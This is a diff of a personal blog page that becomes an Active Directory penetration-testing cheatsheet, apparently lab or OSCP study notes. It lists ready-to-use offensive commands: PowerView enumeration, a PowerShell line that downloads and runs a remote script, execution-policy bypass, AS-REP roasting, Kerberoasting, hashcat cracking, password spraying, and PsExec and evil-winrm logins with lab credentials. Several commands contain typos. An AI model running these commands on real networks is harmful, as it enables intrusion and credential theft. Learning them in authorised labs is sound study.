@@ -9,33 +9,33 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Cheatsheet</title>
-    <meta name="title" content="Cheatsheet">
-    <meta name="description" content="https://hashcat.net/wiki/doku.php?id=example_hashes">
+    <title>AD Cheatsheet</title>
+    <meta name="title" content="AD Cheatsheet">
+    <meta name="description" content="Mindmap = https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://docs.example.com/cheatsheet/">
+    <link rel="canonical" href="https://docs.example.com/cheatsheet/ad-cheatsheet/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://docs.example.com/cheatsheet/">
-    <meta property="og:title" content="Cheatsheet">
-    <meta property="og:description" content="https://hashcat.net/wiki/doku.php?id=example_hashes">
+    <meta property="og:url" content="https://docs.example.com/cheatsheet/ad-cheatsheet/">
+    <meta property="og:title" content="AD Cheatsheet">
+    <meta property="og:description" content="Mindmap = https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://docs.example.com/cheatsheet/">
-    <meta property="twitter:title" content="Cheatsheet">
-    <meta property="twitter:description" content="https://hashcat.net/wiki/doku.php?id=example_hashes">
+    <meta property="twitter:url" content="https://docs.example.com/cheatsheet/ad-cheatsheet/">
+    <meta property="twitter:title" content="AD Cheatsheet">
+    <meta property="twitter:description" content="Mindmap = https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../resources/css/retype.css?v=3.11.0.814774888524" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=3.11.0.814774888524" rel="stylesheet">
 
-    <script data-cfasync="false" src="../resources/js/config.js?v=3.11.0.814774888524" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../resources/js/lunr.js?v=3.11.0.814774888524" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../resources/js/prism.js?v=3.11.0.814774888524" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.814774888524" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.814774888524" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.814774888524" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -50,7 +50,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="retype-branding-logo" href="../" class="flex items-center leading-snug text-xl">
+                        <a id="retype-branding-logo" href="../../" class="flex items-center leading-snug text-xl">
                             <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Annsh&#x27;s Blog</span>
                         </a>
                     </div>
@@ -150,33 +150,203 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="cheatsheet" class="break-words">
+<doc-anchor-target id="ad-cheatsheet" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cheatsheet">#</doc-anchor-trigger>
-        <span>Cheatsheet</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ad-cheatsheet">#</doc-anchor-trigger>
+        <span>AD Cheatsheet</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="nmap">
+<doc-anchor-target id="active-directory-methodology">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#active-directory-methodology">#</doc-anchor-trigger>
+        <span>Active Directory Methodology</span>
+    </h3>
+</doc-anchor-target>
+<p>Mindmap = <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</a></p>
+<p>AD Enumeration
+- Using net user /domain
+- PowerView (Users and Groups)</p>
+<p>Repeated Enumeration
+- <code v-pre>Get-NetLoggedon | select UserName</code> ⇒ get all the users logged on the current machine
+- <code v-pre>Get-NetSession</code> ⇒ List of active sessions on the current machine
+- <code v-pre>Invoke-UserHunter -CheckAccess</code>  ⇒ checks if domain admin is logged onto any computers and if we have admin access to those computers</p>
+<p>AD Exploitation
+- Kerberoasting
+- AS-REP Roasting
+- Password Spraying using SMB/crackmapexec (after getting creds from kerberoasting/as-rep roasting)
+- Cached AD Credentials using Mimikatz</p>
+<p>AD Lateral Movement
+- Port Forwarding / Tunneling
+- Overpass the Hash using Rubeus</p>
+<p>Accessing AD machines
+- RDP
+- psexec
+- evil-winrm</p>
+<p>Attack Privilege Requirements -</p>
+<p>Kerbrute Enumeration - No domain access required
+Pass the Ticket - Access as a user to the domain required
+Kerberoasting - Access as any user required
+AS-REP Roasting - Access as any user required
+Golden Ticket - Full domain compromise (domain admin) required
+Silver Ticket - Service hash required
+Skeleton Key - Full domain compromise (domain admin) required</p>
+<doc-anchor-target id="ad-enumeration">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
-        <span>Nmap</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ad-enumeration">#</doc-anchor-trigger>
+        <span>AD Enumeration</span>
     </h2>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">sudo nmap -p- -A -Pn -v --open $IP</code></pre>
-</doc-codeblock></div>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">sudo nmap -sS -sV -T4 -oN nmap_default.txt &lt;IP&gt;</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="edit-etchosts-file">
+<doc-anchor-target id="net-commands">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#edit-etchosts-file">#</doc-anchor-trigger>
-        <span>Edit /etc/hosts file</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#net-commands">#</doc-anchor-trigger>
+        <span>net commands</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>net users</code> ⇒ display users from current local machine</p>
+<p><code v-pre>net useres /domain</code> ⇒ display users from the DC</p>
+<p><code v-pre>net groups /domain</code> ⇒ enumerate groups on the DC</p>
+<p><code v-pre>net localgroup</code> ⇒ groups on the local machine</p>
+<p><code v-pre>net localgroup administrators</code> ⇒ groups that have admin access on the local machine</p>
+<p><code v-pre>net group “Domain Admis” /domain</code> ⇒ get users within domain admin group</p>
+<p><code v-pre>net group “Client Admis” /domain</code> ⇒ get users within client admin group</p>
+<doc-anchor-target id="enumeration-using-powerview">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration-using-powerview">#</doc-anchor-trigger>
+        <span>Enumeration using PowerView</span>
+    </h3>
+</doc-anchor-target>
+<p>PowerView.ps1 - <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<p>Load and Run PowerView.ps1 script using powershell</p>
+<p><code v-pre>IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/powerview.ps1')</code></p>
+<p><code v-pre>powershell -ep bypass</code>  - bypass the execution policy</p>
+<p><code v-pre>Import-Module .\PowerView.ps1</code>  - Importing PowerView to memory</p>
+<p><code v-pre>Get-NetDomain</code>  - Obtaining domain information</p>
+<p><code v-pre>Get-NetUser</code> - Querying users in the domain</p>
+<p><code v-pre>Get-NetUser | select cn</code> - Querying users using select statement</p>
+<p><code v-pre>Get-NetGroup | select cn</code>  - Querying groups in the domain using PowerView</p>
+<p><code v-pre>Get-NetGroup &quot;Sales Department&quot; | select member</code>  - Enumerating the &quot;Sales Department&quot; group</p>
+<p><code v-pre>Get-NetComputer | select operatingsystem,dnshostname</code>  - Displaying OS and hostname</p>
+<p><code v-pre>Find-LocalAdminAccess</code>  - Scanning domain to find local administrative privileges for our user</p>
+<p><a href="https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html?highlight=powerview#powerviewsharpview">https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html?highlight=powerview#powerviewsharpview</a></p>
+<p><code v-pre>Get-DomainController</code></p>
+<p><code v-pre>Get-DomianComputer | select sameaccountname, cn, name</code></p>
+<p><code v-pre>Get-DomianUser | select name, memberof</code></p>
+<p><code v-pre>Get-DomainGroup | select name, member</code></p>
+<p><code v-pre>Get-DomainGroupMember -Identity &quot;Domain Admins&quot;</code></p>
+<p><code v-pre>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></p>
+<p><code v-pre>Get-NetLoggedon | select UserName</code> ⇒ get all the users logged on the current machine</p>
+<p><code v-pre>Get-NetSession</code> ⇒ List of active sessions on the current machine</p>
+<p><code v-pre>Invoke-UserHunter -CheckAccess</code>  ⇒ checks if domain admin is logged onto any computers and if we have admin access to those computers</p>
+<doc-anchor-target id="ad-exploitation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ad-exploitation">#</doc-anchor-trigger>
+        <span>AD Exploitation</span>
+    </h2>
+</doc-anchor-target>
+<hr>
+<doc-anchor-target id="as-rep-roasting">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#as-rep-roasting">#</doc-anchor-trigger>
+        <span>AS-REP Roasting</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>On Linux -</p>
+<p><code v-pre>impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete</code> - Using GetNPUsers to perform AS-REP roasting</p>
+<p><code v-pre>hashcat --help | grep -i &quot;Kerberos”</code>  - Reviewing the correct Hashcat mode</p>
+<p><code v-pre>sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code> - Cracking the AS-REP hash with Hashcat</p>
+</li>
+<li><p>On Windows -</p>
+<p>Rubeus - <a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<p><code v-pre>.\Rubeus.exe asreproast /nowrap</code></p>
+<p><code v-pre>sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p>
+</li>
+</ul>
+<doc-anchor-target id="kerberoasting">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#kerberoasting">#</doc-anchor-trigger>
+        <span>Kerberoasting</span>
+    </h3>
+</doc-anchor-target>
+<hr>
+<p>Kerberoasting
+⇒ Any user can get a service ticket for a service account
+⇒ service ticket is encrypted using a service account hash
+⇒ crack the hash using hashcat
+⇒ spray password using crackmapexec</p>
+<ul>
+<li>Windows -</li>
+</ul>
+<p><code v-pre>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code>  - Utilizing Rubeus to perform a Kerberoast attack</p>
+<p><code v-pre>sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code> - Cracking the TGS-REP hash</p>
+<ul>
+<li>On Linux -</li>
+</ul>
+<p><code v-pre>sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</code> - Using impacket-GetUserSPNs to perform Kerberoasting on Linux</p>
+<p>If impacket-GetUserSPNs throws the error &quot;KRB_AP_ERR_SKEW(Clock skew too great),&quot; we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.</p>
+<p><em><strong>Looking for Service Accounts (SPN - Service Principal Name)</strong></em></p>
+<p>If SPN is set ⇒ It is a service account</p>
+<p><code v-pre>Get-DomainUser -SPN</code> ⇒ Find service accounts</p>
+<p><code v-pre>Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000</code>  ⇒ get hash</p>
+<p><code v-pre>hashcat -m 13100 -o cracked.txt -a 0 hashes.txt rockyou.txt</code> ⇒ crack the hash using hashcat</p>
+<doc-anchor-target id="psexec">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#psexec">#</doc-anchor-trigger>
+        <span>PsExec</span>
+    </h3>
+</doc-anchor-target>
+<p>Sysinterals - <a href="https://learn.microsoft.com/en-us/sysinternals/">https://learn.microsoft.com/en-us/sysinternals/</a></p>
+<p><code v-pre>.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd</code></p>
+<p>Linux -
+<code v-pre>impacket-psexec oscp/emmet@10.10.1.202</code>  ⇒ get access to shares and shell on machine</p>
+<doc-anchor-target id="winrm--evil-winrm">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#winrm--evil-winrm">#</doc-anchor-trigger>
+        <span>winrm / Evil-winrm</span>
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">echo &quot;10.129.76.146 sea.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">evil-winrm -i &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt;</code></pre>
 </doc-codeblock></div>
+<doc-anchor-target id="hashcat">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#hashcat">#</doc-anchor-trigger>
+        <span>Hashcat</span>
+    </h3>
+</doc-anchor-target>
+<p>Crack passwords after getting hashes from AS-REP roasting or Kerberoasting</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">hashcat hash.asrep /usr/share /wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="crack-zip-files">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#crack-zip-files">#</doc-anchor-trigger>
+        <span>Crack Zip files</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>zip2john it-users.zip</code>  ⇒ gives hash of the zip file</p>
+<p><code v-pre>john it-users.hash --wordlist=/usr/share/wordlists/rockyou.txt</code>  ⇒ crack the hash</p>
+<doc-anchor-target id="search-for-localtxtprooftxt-files-on-windows">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#search-for-localtxtprooftxt-files-on-windows">#</doc-anchor-trigger>
+        <span>Search for local.txt/proof.txt files on Windows</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>dir /s/b local.txt</code></p>
+<p><code v-pre>dir /s/b proof.txt</code></p>
+<p><code v-pre>dir /s/b *.txt</code></p>
+<p><code v-pre>dir /s/b *.log</code></p>
+<doc-anchor-target id="localproof-screenshot">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#localproof-screenshot">#</doc-anchor-trigger>
+        <span>local/proof screenshot</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>type proof.txt</code></p>
+<p><code v-pre>whoami</code></p>
+<p><code v-pre>ipconfig</code></p>
+<p><code v-pre>hostname</code></p>
+<p>=================</p>
 <doc-anchor-target id="connecting-to-rdp">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#connecting-to-rdp">#</doc-anchor-trigger>
@@ -189,9 +359,9 @@
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-bash"><code v-pre class="language-bash">xfreerdp /cert-ignore /u:&lt;uname&gt; /d:&lt;domain&gt; /p:&lt;pwd&gt; /v:&lt;IP&gt;</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="hashcat">
+<doc-anchor-target id="hashcat-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#hashcat">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#hashcat-1">#</doc-anchor-trigger>
         <span>Hashcat</span>
     </h3>
 </doc-anchor-target>
@@ -219,9 +389,9 @@
 <div class="codeblock-title">Kerbrute</div>
 <pre translate="no" class="language-bash"><code v-pre class="language-bash">kerbrute passwordspray -d corp.com .\usernames.txt &quot;pass&quot;</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="as-rep-roasting">
+<doc-anchor-target id="as-rep-roasting-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#as-rep-roasting">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#as-rep-roasting-1">#</doc-anchor-trigger>
         <span>AS-REP Roasting</span>
     </h3>
 </doc-anchor-target>
@@ -229,9 +399,9 @@
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-bash"><code v-pre class="language-bash">impacket-GetNPUsers -dc-ip &lt;DC-IP&gt; &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -request</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="kerberoasting">
+<doc-anchor-target id="kerberoasting-1">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#kerberoasting">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#kerberoasting-1">#</doc-anchor-trigger>
         <span>Kerberoasting</span>
     </h3>
 </doc-anchor-target>
@@ -252,20 +422,20 @@ hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes</code></pre>
                             
                                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../cves/eternalblue/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../cheatsheet/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                                <span class="block mt-1">Eternal Blue</span>
+                                                <span class="block mt-1">Cheatsheet</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../cheatsheet/ad-cheatsheet/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../setup/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                                <span class="block mt-1">AD Cheatsheet</span>
+                                                <span class="block mt-1">Kali Linux Setup</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -309,6 +479,6 @@ hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes</code></pre>
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Cheatsheet", level: 1, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "AD Cheatsheet", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
